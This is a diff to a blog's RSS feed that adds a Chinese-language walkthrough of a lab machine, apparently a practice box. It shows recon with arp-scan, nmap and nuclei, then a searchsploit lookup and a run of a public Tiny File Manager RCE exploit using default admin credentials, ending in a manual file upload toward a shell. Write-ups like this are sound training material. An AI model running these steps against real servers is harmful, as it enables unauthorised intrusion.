@@ -1,5 +1,161 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>TriumphK Blog</title><link>https://7r1UMPHK.github.io</link><description>当你的才华不足以满足你的野心时，应该静下心来努力学习。</description><copyright>TriumphK Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1umphk.github.io/image/20250702120408748.webp</url><title>avatar</title><link>https://7r1UMPHK.github.io</link></image><lastBuildDate>Thu, 10 Jul 2025 14:41:31 +0000</lastBuildDate><managingEditor>TriumphK Blog</managingEditor><ttl>60</ttl><webMaster>TriumphK Blog</webMaster><item><title>内部_sML</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sML.html</link><description>![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>TriumphK Blog</title><link>https://7r1UMPHK.github.io</link><description>当你的才华不足以满足你的野心时，应该静下心来努力学习。</description><copyright>TriumphK Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1umphk.github.io/image/20250702120408748.webp</url><title>avatar</title><link>https://7r1UMPHK.github.io</link></image><lastBuildDate>Fri, 11 Jul 2025 13:32:42 +0000</lastBuildDate><managingEditor>TriumphK Blog</managingEditor><ttl>60</ttl><webMaster>TriumphK Blog</webMaster><item><title>内部_sudo</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</link><description>![image-20250711174235043](https://7r1umphk.github.io/image/20250711174242755.webp)
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.175 08:00:27:14:e1:21       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.997 seconds (128.19 hosts/sec). 4 responded
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p- 192.168.205.175
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 05:42 EDT
+Nmap scan report for 192.168.205.175
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:14:E1:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
+                       
+```
+
+看web
+
+![image-20250711174336944](https://7r1umphk.github.io/image/20250711174337092.webp)
+
+跳转不过去，拦一下jsdelivr的
+
+![image-20250711174539493](https://7r1umphk.github.io/image/20250711174539834.webp)
+
+跳转到
+
+![image-20250711174433367](https://7r1umphk.github.io/image/20250711174433533.webp)
+
+nuclei看看架构
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nuclei -u http://192.168.205.175/tinyfilemanager.php
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.4.5
+
+                projectdiscovery.io
+
+[INF] Current nuclei version: v3.4.5 (outdated)
+[INF] Current nuclei-templates version: v10.2.4 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 67
+[INF] Templates loaded for current scan: 8150
+[INF] Executing 7946 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 204 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 1761 (Reduced 1653 Requests)
+[INF] Using Interactsh Server: oast.pro
+[cookies-without-httponly] [javascript] [info] 192.168.205.175 ['filemanager']
+[cookies-without-secure] [javascript] [info] 192.168.205.175 ['filemanager']
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.175:22
+[ssh-password-auth] [javascript] [info] 192.168.205.175:22
+[ssh-auth-methods] [javascript] [info] 192.168.205.175:22 ['['publickey','password']']
+[ssh-server-enumeration] [javascript] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
+[openssh-detect] [tcp] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
+[form-detection] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[tiny-file-manager] [http] [info] http://192.168.205.175/tinyfilemanager.php/index.php
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[tech-detect:jsdelivr] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[tech-detect:bootstrap] [http] [info] http://192.168.205.175/tinyfilemanager.php
+[apache-detect] [http] [info] http://192.168.205.175/tinyfilemanager.php ['Apache/2.4.62 (Debian)']
+[INF] Scan completed in 1m. 24 matches found.
+                          
+```
+
+搜一下有没有洞
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ searchsploit tiny file manager
+------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                  |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/36364.txt
+Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/36365.txt
+MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                | php/webapps/15768.txt
+Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                           | php/webapps/50828.sh
+TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                             | php/webapps/15194.txt
+------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cd tmp                        
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ searchsploit -m php/webapps/50828.sh
+  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/50828
+     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh
+    Codes: CVE-2021-45010, CVE-2021-40964
+ Verified: False
+File Type: Unicode text, UTF-8 text
+Copied to: /mnt/hgfs/gx/x/tmp/50828.sh
+
+
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh
+
+TIny File Manager Authenticated RCE Exploit.
+
+By FEBIN
+
+/mnt/hgfs/gx/x/tmp/50828.sh &lt;URL&gt; &lt;Admin Username&gt; &lt;Password&gt;
+
+Example: /mnt/hgfs/gx/x/tmp/50828.sh http://files.ubuntu.local/index.php admin 'admin@123'
+
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh http://192.168.205.175/tinyfilemanager.php admin 'admin@123'
+/usr/bin/curl
+[✔] Curl found! 
+/usr/bin/jq
+[✔] jq found! 
+
+[+]  Login Success! Cookie: filemanager=70k14rakb4d73nos0gib5frd7d 
+jq: parse error: Invalid numeric literal at line 1, column 14
+[-] Can't find WEBROOT! Using default /var/www/html 
+[-] File Upload Unsuccessful! Exiting! 
+                                           
+```
+
+失败，但是默认密码登录成功了，所以我们去web自己上传
+
+![image-20250711175333897](https://7r1umphk.github.io/image/20250711175334236.webp)
+
+成了，什么现在都没有，直接访问，拿shell（这个架构。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</guid><pubDate>Fri, 11 Jul 2025 13:32:15 +0000</pubDate></item><item><title>内部_sML</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sML.html</link><description>![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)
 
 复盘一下
 
